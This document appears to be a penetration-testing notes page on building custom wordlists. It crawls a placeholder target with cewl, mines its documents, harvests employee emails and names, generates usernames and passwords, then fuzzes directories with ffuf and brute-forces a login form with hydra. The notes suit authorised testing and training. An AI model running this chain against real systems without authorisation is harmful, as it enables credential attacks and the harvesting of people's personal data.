# Custom Wordlist Attack Chain

Generic wordlists encode what is common on the internet. They do not contain the target's product names, project codenames, office locations, or the surname of the person who built the server. This chain builds a list out of the target's own vocabulary, cleans it into something a tool can consume, and then spends it on directory discovery and login brute force.

Three stages, and each one is only worth doing because the next one exists: **collect**, **clean**, **use**. The clean stage is the one people skip and the one that decides whether the whole chain is worth anything.

A useful custom list mixes three categories:

- Company keywords — products, project names, slogans, office locations
- Technology keywords — framework or [[Security-Terms#^cms|CMS]] specific paths (WordPress plugins, Laravel routes)
- Generic keywords — `admin`, `api`, `assets`, `dev`, `login`, `settings`

## Stage 1 — Collect

### Crawl the site for its own words

```bash
cewl -d 2 -m 3 --lowercase --with-numbers -e --email_file emails.txt -w cewl_words.txt \
  http://target.local
```

- `-d 2` → crawl depth. Spidering means open a page, follow its links, follow the links on those, and so on; depth is how many hops out from the start page it goes. Depth 2 is a good first pass, depth 3 on a large site takes a long time for diminishing returns
- `-m 3` → minimum word length. Below 3 you collect `a`, `of`, `to` and the list becomes noise
- `--lowercase` → normalises at collection time, which saves work in stage 2
- `-e --email_file emails.txt` → harvest email addresses as well, into a separate file. **Easy to omit**, and omitting it throws away the highest-value output of the whole crawl: emails give you the organisation's username format for free
- `-w` → write to a file. Without it the words go to stdout and vanish

### Mine hosted documents

```bash
wget -r -A pdf,docx,xlsx -np -nH http://target.local/docs/
for f in $(find target.local/docs -name '*.pdf'); do
  strings -n 5 "$f" | grep -vP '^[/<>%0-9\\]|^(stream|endstream|endobj|xref|trailer|startxref)$' >> raw_words.txt
done
```

- `-A pdf,docx,xlsx` → an accept filter on extension, so you download documents and not the whole site
- `-np` → no parent, or wget climbs out of `/docs/` and mirrors everything
- `strings -n 5` → prints runs of readable text five characters or longer from a binary file
- the `grep -v` → **the step that makes this usable.** `-v` inverts the match, keeping lines that do *not* match, and the pattern drops PDF structural markers. Without it, `raw_words.txt` is mostly `endobj` and hex fragments, and the noise survives every later filter
- also worth reading, though not covered here: document metadata (`exiftool`) names the author, the software and often the internal file path

### Extract emails and derive usernames

```bash
grep -RhiaoP '[A-Za-z0-9._%+-]+@target\.com' target.local/docs | sort -u > emails_docs.txt
```

```bash
grep -Po '^[^@]+' emails_docs.txt > users_from_emails.txt
```

- `-R` recursive, `-h` suppress filenames, `-i` case-insensitive, `-o` print **only the matched address** rather than the whole line, `-a` treat binary files as text, `-P` Perl regex
- `-a` is the one that matters here → without it `grep` reports `Binary file matches` and prints nothing, which looks exactly like finding no addresses in a directory full of them
- `-o` similarly → without it you get whole lines of PDF noise wrapped around each address
- `^[^@]+` → one or more characters that are not `@`, anchored to the line start. Strips the domain and leaves the local part as a username candidate
- escape the dot in the domain (`target\.com`) → an unescaped `.` matches any character and pulls in addresses at other domains

### Harvest names from public pages

```bash
curl -s http://social.target.local/ | grep -Po '(?<=<h3 class="profile-name">)[^<]+' > names.txt
```

- `(?<=...)` → a positive lookbehind: the text before the match is required but **not included** in the output. So the tag anchors the match without being printed
- `[^<]+` → everything up to the next `<`, which is the closing tag
- read the page source first and match the tag that is actually there → this selector is an example, and copying it without checking gives you an empty file that looks like a page with no names on it
- for anything JavaScript-rendered, this fails silently; take the JSON the page fetches instead

### Build username permutations

```bash
awk '{print tolower($1)"."tolower($2)}' names.txt > users_first.last.txt
```

```bash
awk '{print tolower(substr($1,1,1))tolower($2)}' names.txt > users_flast.txt
```

```bash
awk '{print tolower($1)tolower(substr($2,1,1))}' names.txt > users_firstl.txt
```

- `awk` splits each line on whitespace; `$1` is the first field, `$2` the second
- `substr($1,1,1)` → one character starting at position 1, which produces the initial
- `tolower()` on everything → case mismatches cost you real hits against case-sensitive systems and cost you nothing against case-insensitive ones
- these produce `alex.johnson`, `ajohnson`, and `alexj` from `Alex Johnson`
- a middle name or a two-word surname breaks the field positions → check a few lines of output against the input before generating thousands

## Stage 2 — Clean

Raw output is noisy: duplicates, mixed case, punctuation fragments, Windows line endings. A bloated list wastes brute-force time; a fragmented one tries `Helios`, `helios` and `HELios` as three separate candidates and gets three separate failures.

### Merge and normalise the words

```bash
cat cewl_words.txt raw_words.txt | sort -u > words_raw.txt
```

```bash
cat words_raw.txt | tr '[:upper:]' '[:lower:]' | tr -d '\r' \
  | grep -P '^[a-z0-9][a-z0-9._-]{4,}$' | sort -u > words_clean.txt
```

```bash
wc -l words_clean.txt && head words_clean.txt
```

- `sort -u` → sorts alphabetically and discards duplicates
- `tr '[:upper:]' '[:lower:]'` → one canonical case, so the same word is one candidate
- `tr -d '\r'` → deletes carriage returns left by Windows-authored documents. **The invisible one.** A trailing `\r` makes every request ask for `admin%0D` instead of `admin`, so a perfectly good list produces a run of clean 404s and you conclude the words were wrong
- `grep -P '^[a-z0-9][a-z0-9._-]{4,}$'` → keep entries starting with a letter or digit followed by four or more letters, digits, dots, underscores or dashes. Minimum five characters total, and no punctuation fragments
- `wc -l` then `head` → **the sanity check, and it is the read for this whole stage.** Do not skip it; it is the only place the pipeline tells you whether it worked

### Merge the usernames

```bash
cat users_first.last.txt users_flast.txt users_firstl.txt users_from_emails.txt \
  | tr -d '\r' | sort -u > users.txt
```

- same `tr -d '\r'` as above, for the same invisible reason
- `sort -u` collapses the overlap between conventions, which is often substantial
- if the email evidence showed one clear convention, **use only that file**. Three conventions triples your request count and lockout risk to cover forms you already have evidence against

### Generate a pattern-based password list

```bash
crunch 11 11 -t Helios20%%! -o pass_helios.txt
```

```bash
wc -l pass_helios.txt
```

- both `11` values → minimum and maximum length, and they must match the template's length
- `-t` → the template. `%` is replaced by a digit, so two `%` gives `00` to `99` and exactly 100 lines
- placeholders: `%` digit, `@` lowercase letter, `,` uppercase letter, `^` symbol
- **estimate the size before running.** Charset size raised to the power of the number of placeholders is the line count: six `^` symbols over a 16-symbol set is 16^6, which is 16 million lines and roughly 200MB. `crunch` prints its estimate and asks nothing before filling your disk
- `-o` → write to file rather than stdout

## Stage 3 — Use

### Directory and file discovery with the custom list

```bash
ffuf -w words_clean.txt -u http://target.local/FUZZ -e .php,.html,/ -mc 200,301,302 \
  -ac -o ffuf-custom.json
```

- `-w` → your cleaned wordlist
- `FUZZ` → the placeholder each word is substituted into. It must sit where the path goes; move it into the host position and you are doing [[Virtual-Host-Discovery]] instead, with the same command and completely different meaning
- `-e .php,.html,/` → test each word with these suffixes appended. The trailing `/` is the one that finds directories
- `-mc 200,301,302` → match only these statuses. Add `401,403` when you want to map what exists but is protected, which is often the more interesting map
- `-ac` → autocalibrate against the server's miss shape. Without it a soft 404 makes every word a hit; with it, most filtering problems disappear
- the same tool covers subdomains, parameters and API endpoints — the only change is where `FUZZ` sits

### Login brute force with the custom lists

```bash
hydra -L users.txt -P pass_helios.txt -f -V -t 4 target.local \
  http-post-form '/path/login.php:username=^USER^&password=^PASS^:S=SUCCESS_STRING'
```

- `-L` username file, `-P` password file. Lowercase `-l` / `-p` take a single value instead
- `-f` → stop at the first valid pair. Without it hydra keeps going and buries the hit
- `-V` → print every attempt, so you can see it is actually sending what you think it is
- `-t 4` → four parallel threads. Raise cautiously: high counts trip lockouts, and a lockout does not just end this attack, it invalidates every result after it fired
- the `http-post-form` argument is three colon-separated parts: the path to the form handler, the POST body with `^USER^` and `^PASS^` placeholders, and the success or failure condition. `S=` matches a string present on **success**, `F=` a string present on **failure**
- **read the form's actual HTML before writing part two.** Field names are frequently not `username` and `password`, and a missing hidden field — a [[Security-Terms#^csrf|CSRF]] token especially — makes every attempt fail identically, which reads as "no valid credentials" rather than "the request was malformed"
- prefer `F=` over `S=` when you can → you know exactly what failure looks like because you have seen it; you are guessing at success

## Output map

| File              | Contents                    | Used for                      |
| ----------------- | --------------------------- | ----------------------------- |
| `cewl_words.txt`  | Site keywords               | merged into `words_clean.txt` |
| `raw_words.txt`   | Strings from PDFs           | merged into `words_clean.txt` |
| `emails_docs.txt` | Addresses at the domain     | username format evidence      |
| `words_clean.txt` | Cleaned keyword list        | ffuf directory discovery      |
| `names.txt`       | Employee names              | username generation           |
| `users.txt`       | All username permutations   | hydra `-L`                    |
| `pass_helios.txt` | Pattern-generated passwords | hydra `-P`                    |
